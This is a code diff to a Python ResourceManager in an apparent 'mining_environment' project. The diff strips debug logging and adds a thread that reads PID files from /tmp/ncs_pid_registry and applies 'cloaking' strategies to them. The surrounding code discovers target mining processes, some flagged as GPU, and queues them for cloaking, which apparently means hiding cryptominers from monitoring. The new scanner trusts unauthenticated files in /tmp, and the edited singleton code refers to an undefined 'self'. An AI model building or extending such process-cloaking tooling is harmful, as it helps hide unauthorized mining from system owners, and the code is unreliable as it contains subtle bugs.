@@ -275,25 +275,20 @@ class ResourceManager(IResourceManager):
         with cls._instance_lock:
             if cls._instance is None:
                 cls._instance = super(ResourceManager, cls).__new__(cls)
-                # 🪲 DEBUG: Log singleton creation timing
-                import time
-                creation_time = time.time()
-                print(f"🔍 [DEBUG] ResourceManager singleton created at {creation_time}")
+                # **Singleton created** (singleton đã tạo)
+                self._creation_time = time.time()
         return cls._instance
 
     def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
         if getattr(self, '_initialized', False):
-            # 🪲 DEBUG: Log singleton access timing
-            import time
-            access_time = time.time()
-            print(f"🔍 [DEBUG] ResourceManager singleton accessed at {access_time} (already initialized)")
+            # **Singleton already initialized** (singleton đã khởi tạo)
+            module_logger.debug(f"ResourceManager singleton accessed (already initialized)")
             return
 
         self._initialized = True
-        # 🪲 DEBUG: Log initialization timing
-        import time
-        init_time = time.time()
-        print(f"🔍 [DEBUG] ResourceManager initialization started at {init_time}")
+        # **Initialization started** (bắt đầu khởi tạo)
+        self._init_time = time.time()
+        module_logger.debug(f"ResourceManager initialization started")
         
         # ✅ UNIFIED: Use unified logger for consistent logging hierarchy
         self.logger = get_unified_logger('resource_manager')
@@ -552,12 +547,8 @@ class ResourceManager(IResourceManager):
                     self.logger.info("✅ Direct Registry Observer established successfully")
                     self.logger.info("📊 ResourceManager will receive immediate process notifications")
                     
-                    # **Debug: Display current registry statistics** (hiển thị thống kê registry hiện tại)
-                    try:
-                        stats = self.direct_registry.get_statistics()
-                        self.logger.debug(f"[REGISTRY-STATS] {stats}")
-                    except Exception as stats_err:
-                        self.logger.debug(f"[REGISTRY-STATS] Unable to read stats: {stats_err}")
+                    # **Registry statistics logged at startup** (thống kê registry được ghi lại khi khởi động)
+                    # Stats available via get_statistics() method when needed
                         
                 else:
                     self.logger.error("❌ Failed to register Direct Registry Observer")
@@ -681,8 +672,7 @@ class ResourceManager(IResourceManager):
                 
                 self.logger.info(f"🔍 [PHASE3++] Checking hook readiness for PID {pid}")
                 
-                # ✅ ENHANCED DEBUG: Log current coordinator state
-                self.logger.debug(f"🔍 [DEBUG] Current hooks_ready state: {getattr(coordinator, 'hooks_ready', {})}")
+                # **Coordinator state available for debugging** (trạng thái coordinator có sẵn để debug)
                 
                 # ✅ AUTO-REGISTRATION FALLBACK: Register PID if not already registered
                 if pid not in getattr(coordinator, 'hooks_ready', {}):
@@ -756,9 +746,8 @@ class ResourceManager(IResourceManager):
         pid = process.pid
         name = process.name
         
-        # ✅ DIAGNOSTIC: Log entry point với DEBUG level
-        self.logger.debug(f"🔍 [DIAGNOSTIC] enqueue_cloaking called for {name} (PID={pid})")
-        self.logger.debug(f"📊 Current process_states: {dict(list(self.process_states.items())[:5])}...")
+        # **Process enqueueing started** (bắt đầu đưa tiến trình vào hàng đợi)
+        self.logger.debug(f"Enqueueing cloaking for {name} (PID={pid})")
         
         try:
             if self.process_states.get(pid) == "cloaked":
@@ -1012,7 +1001,7 @@ class ResourceManager(IResourceManager):
         discovered_count = 0
         
         try:
-            self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Starting psutil.process_iter scan...")
+            self.logger.info(f"Starting process discovery scan...")
             process_count = 0
             target_found = 0
             
@@ -1022,7 +1011,7 @@ class ResourceManager(IResourceManager):
                     proc_name = proc.info['name']
                     if proc_name in target_processes:
                         target_found += 1
-                        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Found target process: {proc_name}")
+                        self.logger.info(f"Found target process: {proc_name}")
                         pid = proc.info['pid']
                         is_gpu = target_processes[proc_name]
                         
@@ -1049,10 +1038,9 @@ class ResourceManager(IResourceManager):
                                 self.logger.info(f"🔍 [PROCESS DISCOVERY] Enqueuing {proc_name} PID={pid} for cloaking")
                                 self.enqueue_cloaking(mining_process)
                                 discovered_count += 1
-                                self.logger.info(f"🔍 [COUNTER DEBUG] New process added - discovered_count now: {discovered_count}")
+                                self.logger.debug(f"New process added - discovered count: {discovered_count}")
                             else:
-                                self.logger.info(f"🔍 [PROCESS DISCOVERY] {proc_name} PID={pid} already tracked, skipping (not counted)")
-                                self.logger.info(f"🔍 [COUNTER DEBUG] Process already exists - discovered_count remains: {discovered_count}")
+                                self.logger.debug(f"Process {proc_name} PID={pid} already tracked, skipping")
                                 
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     # Skip processes that can't be accessed
@@ -1065,8 +1053,7 @@ class ResourceManager(IResourceManager):
             
         # Final detailed report
         current_tracked_count = len(self.mining_processes) if hasattr(self, 'mining_processes') else 0
-        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Scan completed - total processes: {process_count}, targets found: {target_found}")
-        self.logger.info(f"🔍 [COUNTER DEBUG] Final counts - newly discovered: {discovered_count}, currently tracked: {current_tracked_count}")
+        self.logger.info(f"Process discovery completed - total scanned: {process_count}, targets found: {target_found}, newly discovered: {discovered_count}")
         
         # Improved final message based on discovery context
         if discovered_count > 0:
@@ -1346,6 +1333,16 @@ class ResourceManager(IResourceManager):
             
             # ✅ SIMPLIFIED: DirectPIDRegistry-driven architecture only
             
+            # ✅ NEW: Start File-Based Registry Scanner Thread (Shared File-Based Registry Solution)
+            scanner_thread = threading.Thread(
+                target=self._file_registry_scanner_worker,
+                daemon=True,
+                name="FileRegistryScanner"
+            )
+            scanner_thread.start()
+            self.workers.append(scanner_thread)
+            self.logger.info("📁 [FILE-SCANNER] File-based registry scanner thread started")
+            
             # --- NEW: Force-create detailed log files for core modules ---
             try:
                 from mining_environment.scripts.unified_logging import get_unified_logger
@@ -1480,8 +1477,10 @@ class ResourceManager(IResourceManager):
 
         while not self._stop_flag:
             try:
-                # ✅ DIAGNOSTIC: Log queue status
-                self.logger.debug(f"🔍 [DIAGNOSTIC] CloakingWorker checking queue... Size: {self.resource_adjustment_queue.qsize()}")
+                # **Queue status check** (kiểm tra trạng thái hàng đợi)
+                queue_size = self.resource_adjustment_queue.qsize()
+                if queue_size > 0:
+                    self.logger.debug(f"Processing cloaking queue, size: {queue_size}")
                 
                 item = self.resource_adjustment_queue.get(timeout=1)
                 priority, count_val, task = item
@@ -1489,7 +1488,7 @@ class ResourceManager(IResourceManager):
                 p = task.get('process')
                 if not p:
                     self.resource_adjustment_queue.task_done()
-                    self.logger.debug("🔄 [DIAGNOSTIC] Skipping task - no process object")
+                    self.logger.debug("Skipping task - no process object")
                     continue
 
                 pid = p.pid
@@ -1521,8 +1520,7 @@ class ResourceManager(IResourceManager):
                         from coordinator import get_hook_coordinator
                         coordinator = get_hook_coordinator()
                         
-                        # ✅ ENHANCED DEBUG: Log current coordinator state
-                        self.logger.debug(f"🔍 [DEBUG] Coordinator state: {getattr(coordinator, 'hooks_ready', {})}")
+                        # **Coordinator state check** (kiểm tra trạng thái coordinator)
                         
                         # ✅ ENHANCED AUTO-REGISTRATION: Proactive registration với thread synchronization
                         if pid not in getattr(coordinator, 'hooks_ready', {}):
@@ -1559,10 +1557,8 @@ class ResourceManager(IResourceManager):
                     except Exception as coord_check_err:
                         self.logger.warning(f"⚠️ [COORDINATION-CHECK] Failed to verify coordination: {coord_check_err}")
                     
-                    # ✅ DIAGNOSTIC: Log strategy processing start
-                    self.logger.debug(f"🔍 [DIAGNOSTIC] Starting strategy processing for PID={pid}")
-                    self.logger.debug(f"📋 Strategies to apply: {strategies}")
-                    self.logger.debug(f"🔒 Coordination verified: {coordination_verified}")
+                    # **Strategy processing started** (bắt đầu xử lý chiến lược)
+                    self.logger.debug(f"Processing {len(strategies)} strategies for PID={pid}, coordination: {coordination_verified}")
                     
                     for strat in strategies:
                         try:
@@ -1595,9 +1591,8 @@ class ResourceManager(IResourceManager):
                             # ✅ INTELLIGENT CACHING: Use advanced cache system
                             creation_start = time.time()
                             
-                            # ✅ DIAGNOSTIC: Log each strategy attempt
-                            self.logger.debug(f"🎯 [DIAGNOSTIC] Attempting strategy: {strat} for PID={pid}")
-                            self.logger.debug(f"🔒 [COORDINATION] Strategy {strat} - coordination_verified: {coordination_verified}")
+                            # **Strategy application** (áp dụng chiến lược)
+                            self.logger.debug(f"Applying strategy: {strat} for PID={pid}")
                             
                             # ✅ CACHE LOOKUP: Try to get from intelligent cache
                             s = self.shared_resource_manager.strategy_cache.get(
@@ -1657,7 +1652,7 @@ class ResourceManager(IResourceManager):
                                 # ✅ FIX: Cập nhật strategy_results dựa trên apply_success
                                 if apply_success:
                                     strategy_results['applied'].append(strat)
-                                    self.logger.debug(f"✅ [Strategy Success] {strat} successfully applied to PID={pid}")
+                                    self.logger.debug(f"Strategy {strat} applied successfully to PID={pid}")
                                 else:
                                     strategy_results['failed'].append(strat)
                                     self.logger.warning(f"❌ [Strategy Failed] {strat} failed for PID={pid}")
@@ -2244,6 +2239,185 @@ class ResourceManager(IResourceManager):
                 'action_required': 'CHECK_SYSTEM',
                 'error': str(e)
             }
+
+    def _file_registry_scanner_worker(self) -> None:
+        """
+        **File-Based Registry Scanner Worker** (worker quét registry dựa trên file)
+        
+        Background thread để monitor /tmp/ncs_pid_registry/ directory cho new PID files
+        được tạo bởi DirectPIDRegistry fallback mechanism. Khi detect files mới,
+        process chúng và apply cloaking strategies.
+        
+        This is part of Shared File-Based Registry solution để giải quyết cross-process
+        PID handoff issues khi direct communication fails.
+        """
+        self.logger.info("📁 [FILE-SCANNER] File registry scanner worker started")
+        
+        # **Scanner Configuration** (cấu hình scanner)
+        scan_interval = 2.0  # Scan every 2 seconds for responsiveness
+        processed_files = set()  # Track processed files to avoid duplicates
+        last_cleanup_time = time.time()
+        cleanup_interval = 300  # Cleanup every 5 minutes
+        
+        # **Import required modules for file operations** (nhập module cần thiết cho thao tác file)
+        import json
+        from pathlib import Path
+        
+        # **File registry constants** (hằng số registry file)
+        file_registry_dir = Path("/tmp/ncs_pid_registry")
+        file_prefix = "pid_"
+        file_suffix = ".json"
+        
+        while not self._stop_flag:
+            try:
+                current_time = time.time()
+                
+                # **Periodic cleanup of old processed files tracking** (dọn dẹp định kỳ theo dõi file đã xử lý)
+                if current_time - last_cleanup_time >= cleanup_interval:
+                    old_size = len(processed_files)
+                    # Remove tracking for files that no longer exist
+                    processed_files = {f for f in processed_files if (file_registry_dir / f).exists()}
+                    new_size = len(processed_files)
+                    if old_size != new_size:
+                        self.logger.debug(f"🧹 [FILE-SCANNER] Cleaned processed files tracking: {old_size} → {new_size}")
+                    last_cleanup_time = current_time
+                
+                # **Check if registry directory exists** (kiểm tra thư mục registry có tồn tại)
+                if not file_registry_dir.exists():
+                    time.sleep(scan_interval)
+                    continue
+                
+                # **Scan for PID files** (quét file PID)
+                discovered_files = []
+                try:
+                    for file_path in file_registry_dir.glob(f"{file_prefix}*{file_suffix}"):
+                        if file_path.name not in processed_files:
+                            discovered_files.append(file_path)
+                except Exception as scan_err:
+                    self.logger.debug(f"⚠️ [FILE-SCANNER] Directory scan error: {scan_err}")
+                    time.sleep(scan_interval)
+                    continue
+                
+                # **Process discovered files** (xử lý file được phát hiện)
+                for file_path in discovered_files:
+                    try:
+                        success = self._process_registry_file(file_path)
+                        if success:
+                            processed_files.add(file_path.name)
+                            self.logger.info(f"✅ [FILE-SCANNER] Successfully processed: {file_path.name}")
+                        else:
+                            self.logger.warning(f"⚠️ [FILE-SCANNER] Failed to process: {file_path.name}")
+                            # **Mark as processed to avoid infinite retries** (đánh dấu đã xử lý để tránh thử lại vô hạn)
+                            processed_files.add(file_path.name)
+                            
+                    except Exception as process_err:
+                        self.logger.error(f"❌ [FILE-SCANNER] Error processing {file_path.name}: {process_err}")
+                        processed_files.add(file_path.name)  # Mark as processed to avoid retry loops
+                
+                # **Sleep until next scan** (ngủ đến lần quét tiếp theo)
+                time.sleep(scan_interval)
+                
+            except Exception as worker_err:
+                self.logger.error(f"❌ [FILE-SCANNER] Scanner worker error: {worker_err}")
+                time.sleep(scan_interval * 2)  # Sleep longer on error
+        
+        self.logger.info("📁 [FILE-SCANNER] File registry scanner worker stopped")
+
+    def _process_registry_file(self, file_path: Path) -> bool:
+        """
+        **Process Registry File** (xử lý file registry)
+        
+        Read và process a single PID registry file created by DirectPIDRegistry fallback.
+        Extract PID và metadata, then apply cloaking strategies.
+        
+        Args:
+            file_path: Path to the registry file
+            
+        Returns:
+            bool: True nếu processing successful
+        """
+        try:
+            self.logger.debug(f"📄 [FILE-PROCESS] Processing registry file: {file_path.name}")
+            
+            # **Atomic read with file locking** (đọc nguyên tử với khóa file)
+            import json
+            import fcntl
+            
+            with open(file_path, 'r') as f:
+                # **Lock file during read để ensure consistency** (khóa file trong khi đọc để đảm bảo tính nhất quán)
+                fcntl.flock(f.fileno(), fcntl.LOCK_SH)  # Shared lock for reading
+                file_data = json.load(f)
+            
+            # **Validate file data structure** (xác thực cấu trúc dữ liệu file)
+            required_fields = ['pid', 'timestamp', 'metadata', 'created_by']
+            for field in required_fields:
+                if field not in file_data:
+                    self.logger.error(f"❌ [FILE-PROCESS] Missing required field '{field}' in {file_path.name}")
+                    return False
+            
+            # **Extract PID và metadata** (trích xuất PID và metadata)
+            pid = file_data['pid']
+            metadata = file_data['metadata']
+            file_timestamp = file_data['timestamp']
+            created_by = file_data['created_by']
+            
+            # **Validate PID** (xác thực PID)
+            if not isinstance(pid, int) or pid <= 0:
+                self.logger.error(f"❌ [FILE-PROCESS] Invalid PID: {pid} in {file_path.name}")
+                return False
+            
+            # **Check if process still exists** (kiểm tra process có còn tồn tại)
+            try:
+                import psutil
+                process_obj = psutil.Process(pid)
+                if not process_obj.is_running():
+                    self.logger.info(f"ℹ️ [FILE-PROCESS] Process {pid} no longer running - skipping")
+                    return True  # Consider this successful (process ended)
+            except psutil.NoSuchProcess:
+                self.logger.info(f"ℹ️ [FILE-PROCESS] Process {pid} not found - skipping")
+                return True
+            except Exception as psutil_err:
+                self.logger.debug(f"⚠️ [FILE-PROCESS] Could not validate process {pid}: {psutil_err}")
+                # Continue processing anyway
+            
+            # **Log file processing start** (ghi log bắt đầu xử lý file)
+            age = time.time() - file_timestamp
+            self.logger.info(f"📁 [FILE-PROCESS] Processing PID {pid} from {created_by} (age: {age:.1f}s)")
+            
+            # **Call receive_from_registry method** (gọi phương thức receive_from_registry)
+            # This integrates with existing ResourceManager processing flow
+            registry_metadata = {
+                **metadata,  # Include all metadata from file
+                'source': 'file_registry_scanner',
+                'file_path': str(file_path),
+                'file_timestamp': file_timestamp,
+                'scanner_timestamp': time.time(),
+                'age_seconds': age
+            }
+            
+            success = self.receive_from_registry(pid, registry_metadata)
+            
+            if success:
+                self.logger.info(f"✅ [FILE-PROCESS] Successfully processed PID {pid} via file registry")
+                
+                # **Schedule file cleanup after successful processing** (lên lịch dọn dẹp file sau khi xử lý thành công)
+                try:
+                    file_path.unlink()  # Remove processed file
+                    self.logger.debug(f"🗑️ [FILE-PROCESS] Cleaned up processed file: {file_path.name}")
+                except Exception as cleanup_err:
+                    self.logger.debug(f"⚠️ [FILE-PROCESS] Could not cleanup file {file_path.name}: {cleanup_err}")
+                
+                return True
+            else:
+                self.logger.error(f"❌ [FILE-PROCESS] Failed to process PID {pid} from file registry")
+                return False
+                
+        except json.JSONDecodeError as json_err:
+            self.logger.error(f"❌ [FILE-PROCESS] Invalid JSON in {file_path.name}: {json_err}")
+            return False
+        except Exception as e:
+            self.logger.error(f"❌ [FILE-PROCESS] Error processing {file_path.name}: {e}")
+            return False
 
     def shutdown(self):
         """
